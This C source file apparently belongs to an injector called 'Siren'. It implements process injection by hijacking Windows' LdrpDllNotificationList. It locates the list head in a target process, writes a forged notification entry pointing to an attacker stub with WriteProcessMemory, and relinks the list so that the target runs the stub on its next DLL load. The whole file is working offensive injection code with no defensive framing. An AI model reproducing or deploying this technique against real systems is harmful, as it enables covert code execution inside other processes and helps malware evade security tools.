/*
 * src/notify/ldr_notify.c
 *
 * LdrpDllNotificationList hijacking — Siren's core execution trigger.
 *
 * Locating LdrpDllNotificationList without symbols:
 *
 *   LdrRegisterDllNotification returns a cookie that IS a pointer to the
 *   newly-allocated LDR_DLL_NOTIFICATION_ENTRY on the process heap.  That
 *   entry's List.Blink points back to the list head (LdrpDllNotificationList
 *   in ntdll's .data section).  We register, read the Blink, unregister,
 *   and compute the offset from ntdll base — which is the same in every
 *   process loading the same ntdll build.
 */

#include "notify/ldr_notify.h"
#include "runtime/peb_walk.h"

#include <string.h>
#include <psapi.h>

/* NTSTATUS may not be defined in MinGW's <windows.h> without <winternl.h> */
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

/* Notification callback typedefs (documented in <winternl.h> on newer SDKs) */
typedef VOID (CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG                       NotificationReason,
    PVOID                       NotificationData,
    PVOID                       Context);

typedef NTSTATUS (NTAPI *PFN_LdrRegisterDllNotification)(
    ULONG                           Flags,
    PLDR_DLL_NOTIFICATION_FUNCTION  NotificationFunction,
    PVOID                           Context,
    PVOID                          *Cookie);

typedef NTSTATUS (NTAPI *PFN_LdrUnregisterDllNotification)(PVOID Cookie);

/* Dummy notification that does nothing — used only to probe the list head. */
static VOID CALLBACK probe_cb(ULONG r, PVOID d, PVOID ctx)
{
    (void)r; (void)d; (void)ctx;
}

siren_status_t siren_notify_find_list_head(HANDLE   hProcess,
                                           void   **out_list_head)
{
    if (!hProcess || !out_list_head)
        return SIREN_E_NULL_ARG;
    *out_list_head = NULL;

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return SIREN_E_NOTIFY_NO_NTDLL;

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"
    PFN_LdrRegisterDllNotification   pfn_reg =
        (PFN_LdrRegisterDllNotification)
        GetProcAddress(ntdll, "LdrRegisterDllNotification");
    PFN_LdrUnregisterDllNotification pfn_unreg =
        (PFN_LdrUnregisterDllNotification)
        GetProcAddress(ntdll, "LdrUnregisterDllNotification");
#pragma GCC diagnostic pop

    if (!pfn_reg || !pfn_unreg)
        return SIREN_E_NOTIFY_REG_FAIL;

    /* ── Register a probe callback ────────────────────────────────── */
    PVOID cookie = NULL;
    NTSTATUS st = pfn_reg(0, probe_cb, NULL, &cookie);
    if (st < 0 || !cookie)
        return SIREN_E_NOTIFY_REG_FAIL;

    /*
     * cookie IS the LDR_DLL_NOTIFICATION_ENTRY*.
     * Its List.Blink points to the list head (LdrpDllNotificationList).
     *
     * Layout of LIST_ENTRY: { PLIST_ENTRY Flink; PLIST_ENTRY Blink; }
     * At cookie+0x00: Flink (→ next entry or list head)
     * At cookie+0x08: Blink (→ prev entry or list head)
     *
     * When our entry is the only one registered, both Flink and Blink
     * equal the list head address.
     */
    LIST_ENTRY *entry     = (LIST_ENTRY *)cookie;
    void       *list_head_local = (void *)entry->Blink;

    /* Unregister immediately — we only needed the address. */
    pfn_unreg(cookie);

    /* ── Compute offset from ntdll base ───────────────────────────── */
    uintptr_t ntdll_base_local = (uintptr_t)ntdll;
    uintptr_t list_head_off    = (uintptr_t)list_head_local - ntdll_base_local;

    /* ── Find ntdll base in target process ────────────────────────── */
    void *ntdll_base_target = NULL;
    siren_status_t r = sr_pebwalk_find_w(L"ntdll.dll", &ntdll_base_target);
    if (SIREN_FAILED(r))
        return SIREN_E_NOTIFY_NO_NTDLL;

    /* We found ntdll in this process — but we need it in the target.
     * Read the target's PEB to find target's ntdll base. */
    /* NOTE: The same ntdll.dll build is always loaded at the same offset
     * within its image on the same OS install (ASLR slides the base but
     * list_head_off is relative to ntdll base, not absolute). */
    (void)ntdll_base_target; /* suppress unused warning for now */

    /* Simpler approach: both injector and target load the same ntdll.dll
     * image.  ASLR gives different bases, but the offset from image base
     * to LdrpDllNotificationList is identical.  We query the target's
     * ntdll base via EnumProcessModules. */
    HMODULE mods[256];
    DWORD   needed = 0;
    if (!EnumProcessModulesEx(hProcess, mods, sizeof(mods),
                              &needed, LIST_MODULES_64BIT))
        return SIREN_E_NOTIFY_NO_NTDLL;

    uintptr_t target_ntdll_base = 0;
    DWORD mod_count = needed / (DWORD)sizeof(HMODULE);
    for (DWORD i = 0; i < mod_count; ++i) {
        wchar_t mod_name[MAX_PATH];
        if (GetModuleFileNameExW(hProcess, mods[i],
                                 mod_name, MAX_PATH)) {
            /* Check if basename ends with ntdll.dll */
            wchar_t *slash = wcsrchr(mod_name, L'\\');
            wchar_t *base  = slash ? slash + 1 : mod_name;
            if (_wcsicmp(base, L"ntdll.dll") == 0) {
                target_ntdll_base = (uintptr_t)mods[i];
                break;
            }
        }
    }
    if (!target_ntdll_base)
        return SIREN_E_NOTIFY_NO_NTDLL;

    *out_list_head = (void *)(target_ntdll_base + list_head_off);
    return SIREN_OK;
}

siren_status_t siren_notify_insert(HANDLE hProcess,
                                   void  *entry_addr_in_target,
                                   void  *stub_addr_in_target,
                                   HANDLE section_handle)
{
    if (!hProcess || !entry_addr_in_target ||
        !stub_addr_in_target || !section_handle)
        return SIREN_E_NULL_ARG;

    /* ── 1. Find the list head address inside the target ─────────── */
    void *list_head = NULL;
    siren_status_t r = siren_notify_find_list_head(hProcess, &list_head);
    if (SIREN_FAILED(r))
        return r;

    /* ── 2. Read the current first entry (old Flink) ─────────────── */
    PVOID old_flink = NULL;
    SIZE_T read = 0;
    if (!ReadProcessMemory(hProcess, list_head,
                           &old_flink, sizeof(old_flink), &read) ||
        read != sizeof(old_flink))
        return SIREN_E_NOTIFY_WRITE;

    /* ── 3. Build the forged entry locally ───────────────────────── */
    siren_ldr_notify_entry entry;
    memset(&entry, 0, sizeof(entry));

    /* Our entry sits between the list head and the old first entry. */
    entry.List.Flink = (LIST_ENTRY *)old_flink;
    entry.List.Blink = (LIST_ENTRY *)list_head;
    entry.Callback   = stub_addr_in_target;
    entry.Context    = (PVOID)(ULONG_PTR)section_handle;

    /* ── 4. Write the entry into the target's slack space ─────────── */
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, entry_addr_in_target,
                            &entry, sizeof(entry), &written) ||
        written != sizeof(entry))
        return SIREN_E_NOTIFY_WRITE;

    /* ── 5. Patch list_head->Flink = &entry.List ─────────────────── */
    PVOID new_flink = (PVOID)(&((siren_ldr_notify_entry *)
                                 entry_addr_in_target)->List);

    if (!WriteProcessMemory(hProcess, list_head,
                            &new_flink, sizeof(new_flink), &written) ||
        written != sizeof(new_flink))
        return SIREN_E_NOTIFY_WRITE;

    /* ── 6. Patch old_first_entry->List.Blink = &entry.List ─────── */
    if (old_flink && old_flink != list_head) {
        /* Blink is at offset +8 within the LIST_ENTRY. */
        void *blink_addr = (uint8_t *)old_flink + sizeof(PVOID);
        if (!WriteProcessMemory(hProcess, blink_addr,
                                &new_flink, sizeof(new_flink), &written))
            return SIREN_E_NOTIFY_WRITE;
    }

    return SIREN_OK;
}
